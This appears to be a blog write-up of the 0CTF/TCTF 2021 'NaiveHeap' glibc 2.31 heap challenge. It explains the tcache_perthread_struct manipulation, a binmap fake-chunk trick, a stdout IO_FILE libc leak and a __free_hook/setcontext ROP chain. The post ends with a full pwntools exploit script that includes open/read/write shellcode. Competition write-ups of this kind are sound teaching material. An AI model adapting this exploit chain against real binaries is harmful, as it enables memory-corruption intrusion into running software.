---
title: 0CTF/TCTF 2021 NaiveHeap
date: 2021-10-01 10:22:19
tags: 
---
0CTF-NaiveHeap
<!--more-->

# Prologue

Last week, I took part in 0CTF final with my teammates@r3kapig and got 2nd place!

I'll introduce the only challenge I solved in the CTF: `NaiveHeap`. Because of lacking knowledge of output buffer, we solved it nearly one day after we exploit locally. After talking to the challenge writer, I fond mine solution is an unexcepted one: I use some `binmap` on `main_arena` as the head of faked chunk bypass a deadly crash by leaving a readable address. 

# Challenge

Glibc-2.31

It's a super simple binary. First, it will  use `seccomp` to disable `syscall_execve` and malloc so many times.

Second, the main part of the challenge, we have an infinite `while` loop to get our command.

0: Go to a backdoor to check if you have GIFT. Btw, GIFT is a flag, which allows you to free an arbitrary address(even we don't know any address) to start the exploit. 

not 0: we could `malloc` a chunk (size ≤0x100 ) and `read` some data. After reading, the chunk will be `free`.

# Solution

## First Step:

So it seems a simple challenge and we need to use GIFT to exploit it. For the first, we don't have much choice because we could only free some address with a chunk head or the binary will crash.

Thus, the first choice is `tcache_perthread_struct` as we could use malloc to fetch it and after `mallo` ,it will be `freed` so that we could get again. 

Now, we could malloc a chunk and free it to tcache and partial write its point by malloc 0x288 to get `tcache_perthread_struct`.

By modifying `tcache_perthread_struct`,  we could control the `counter` of every `tcache_entry`. 

And it's also easy to link arbitrary heap address in `tcache_entry` by partial write.

- `bitmap ( index , count_num )`
    
    It is a function will return a `counts` array. And set `counts[idx*2]==count_num` and idx is the index of `tcache_entry`.
    
    ```python
    def bits(index,k=1):
    	bitmap=[0]*0x80
    	bitmap[index]=k
    	bitmap=bytes(bitmap)
    	return bitmap
    ```
    

```jsx
add(0x98)
add(0x288,bitmap(8*2)+p64(0)*8+b'partial write')
```

## Third Step(1/16)

In order to leak libc-base address, we need to modify `stdout` to perform `IO_FILE LEAK` and what can we control now is the heap area. Thus, it's easy to perform `heap_overlap` on heap and fake a big chunk which could be freed to unsorted-bin so that we could get a `libc-address`. And we could `partially write` this address to make it point at arbitrary `libc-addess`. However, there is a big problem we need to solve before performing this step.

## Second Step

The problem is the binary will free the chunk after malloc so that a chunk-head is needed or binary would crash and return "free(): invalid pointer" because of the invalid chunk-head. By analyzing all the struct above `stdout` in `libc`, I find there is a struct could be used: `binmap` in `tcache`. And if we construct a large bin (size==0x670), there will be a usable chunk head (0x200) on the `binmap`. So that we could continue the exploit mentioned in third step.

- `binmap` is a `bitvector` recording whether bins are definitely empty
    
    

## Fourth Step

After third step, we need to overwrite the data on the `main_arena`, `_nl_global_locale`, and `stderr`.

And you will find if you overwrite the data to `\0` then the binary will crash while calling `strtol` because of `segfault`. In  `_nl_global_locale` +0x68, there is a point and we need to overwrite it with a readable point. So we need to bypass it.

I noticed we could use the `key` member of a `tcache_chunk` . Because it points to `tcache_perthread_struct` so it's 100% readable. Meanwhile, we could leave another `chunk-head` to continue our exploit: overwrite `stdout`.

# Final Step

We could overwrite the `stdout`, and sets its _flags and  `_IO_write_base` to perform `IO_LEAK`. After leaking the `libc-base` address, we could use `Frist Step` to write arbitrary address, such as `__free_hook`. Then, use `setcontext` to hijack the PC to run shellcode. Read the flag's name & `orw` flag.

# Remotely attack

While performing the remote attack, we find the server would not leak the address for the setting of `stdout-buffer` is the default setting. This problem stopped me for about 12hours.  However, my teammate @wang solved this by sending `0xe00 * b'\0'`! I have tested to send data to fill the buffer. However, I used `while loop` and `faild` . Luckily, with @wang's help, we solved it before the end of 0CTF! 

# Exploit

```python

from pwn import *

def cmd(c):
	p.sendline(str(c).encode('utf8'))
def add(size,c=b'A'):
	cmd(1)
	cmd(size)
	p.sendline(c)
def maga(s):
	cmd(0)
	p.send(s.ljust(0x7,b'\\0'))
def bits(index,k=1):
	bitmap=[0]*0x80
	bitmap[index]=k
	bitmap=bytes(bitmap)
	return bitmap
def bit(index=0x4c):
	bitmap=[0]*0x80
	for x in range(0x47,index):
		bitmap[x]=7
	bitmap=bytes(bitmap)
	return bitmap
def gen():
	res=b""
	t=0x270//8
	for x in range(t):
		if(x==0x0a or x==0xa+0x100):
			res+=p64(0)
		else:
			res+=p64(x)
	return res
def X(x=''):
	if(DEBUG):
		gdb.attach(p,x)
DEBUG=0
if(DEBUG):
	p=process("./pwn")
	context.log_level='debug'
else:
	#p=remote("1.117.189.158",60001)
	#p=process("./pwn")
	#p=remote("192.168.174.1",60001)
	p=remote("0.0.0.0",1025)

maga(b"-"+str(0xa0160//8).encode('utf8'))
context.arch='amd64'
X()

cmd(0)

#
add(0x288,bit()+b"\\x00"*(0x128)+p64(0xdeadbeef))
add(0x80)#pad to avoid heap-guess
add(0xa8,b"\\0"*0x88+p64(0xd1))
add(0xb0)
add(0x288,bits(18)+p64(0)*0x9+b'\\x90')
add(0xa8,p64(0)*3+p64(0xc1))#overlap
add(0xc8,p64(0)*3+p64(0xff1))# modify chunkd head
for x in range(9):
	add(0x408,p64(0x21)*(0x3f0//8))
	add(0x288,bits(8))
add(0x408,p64(0x21)*(0x3f0//8))
add(0x288,bits(8))
add(0x288,bits(20))
add(0xb8)#unsotred bin get
add(0x288,b'\\0'*0x287)#clear

add(0x430)#leave a libc address

add(0x370)
add(0x98)
add(0x288,bits(16,8)+p64(0)*8+b'\\xf0')# overlap
add(0x88,b'\\0'*0x18+p64(0xc1))#edit head
add(0x98)# we have a libc chunk at the top of tcache
add(0x288,bits(16,1)+p64(0)*8+b'\\xf0\\xa3')# overlap and modify the point now it points at bitmap in arana 1/16
# creat a avaliable binmap largebin size= [670]

add(0xc8)#pad
add(0x3f8)#pad
add(0x680)#creat the binmap, head == 200, address= 0x7ffff7f5a3f0-0x10
add(0x98)
add(0x1f8,b'\\0'*0x108+p64(0xf1))# fake a new head just before the strol-space struct in order to set a value on that!
add(0x288,bits(30*2,1)+p64(0)*30+b'\\x00\\xa5')# fetch the fake one
add(0x1f8,b'\\0'*0x1a0+p64(0x1800)+b'\\0'*0x18+b'\\xe0\\x32')#1/16
#context.log_level='debug'
#while(0x1000):
#	p.send(b"0")
#p.sendline()
#print(p.read())
p.sendline(b'0'*0xe00)
base=u64(p.read(8))-(0x7ffff7fb19a0-0x7ffff7d6e000)
log.warning(hex(base))
"""

while(1):
	data=p.read(8)
	print(data)
	if((b"gift" not in data )and (data!=b'')):
		break

base=u64(data)-(0x7ffff7fb19a0-0x7ffff7d6e000)
log.warning(hex(base))
#if(base&0xffff000000000000!=0):
#	exit(1)
"""
add(0x288,bits(30*2)+p64(0)*30+p64(base+0x1eeb28))# leave a __free_hook on tacache
raw_input()
setcontext=0x7ffff7dc60dd-0x7ffff7d6e000+base
rdx2rdi=0x7ffff7ec2930-0x7ffff7d6e000+base
address=0x7ffff7f5cb30-0x7ffff7d6e000+base
rdi=0
rsi=address+0xc0
rdx=0x100
read=0x7ffff7e7f130-0x7ffff7d6e000+base
rsp=rsi
rbp = 153280+base
leave=371272+base
struct =p64(address)+p64(0)*3+p64(setcontext)
struct =struct.ljust(0x68,b'\\0')
struct+=p64(rdi)+p64(rsi)+p64(0)*2+p64(rdx)+p64(0)*2+p64(rsp)+p64(read)
add(0x1f8,p64(rdx2rdi)+struct)
rdx = 0x000000000011c371+base# rdx+r12
sys = 0x7ffff7e7f1e5-0x7ffff7d6e000+base
rax = 304464+base
rdi = 158578+base
rsi = 161065+base
rcx = 653346+base
rax_r10 = 0x000000000005e4b7+base
orw=[ rdi,0xdddd000,rsi,0x10000,rdx,7,0,rcx,0x22,0x7ffff7e89a20-0x7ffff7d6e000+base,#mmap(0xdddd000,0x1000,7,0x22,0,0)
rax,0,rdi,0,rsi,0xdddd000,rdx,0x1000,0,sys,0xdddd000
]
rop=flat(orw)
p.send(rop.ljust(0x100,b'\\0'))

#context.log_level='debug'
sc='''
mov rax,1
mov rdi,1
mov rsi,0xdddd300
mov rdx,0x10000
syscall
'''
fk='''
mov rdi,rax
mov rax,0
mov rsi,0xdddd300
mov rdx,100
syscall
mov rax,1
mov rdi,rax
syscall
'''
poc = asm(shellcraft.open(b"/home/pwn/flag-asdasdasdasd"))+asm(fk)
#poc = asm(shellcraft.open(b'/home/pwn/'))+asm(shellcraft.getdents64(3, 0xdddd000 + 0x300, 0x600))+asm(sc)
p.send(poc)

p.interactive()
```

# Summary

This challenge is a simple but hard challenge for my solution and there are only 4teams that solved this challenge before the end of 0CTF. I think I could do better next time because I was stopped by remote leak. If I know the leak-trick, we could be the 2nd solver. Finally, thank 0CTF and my teammates for giving a great weekend.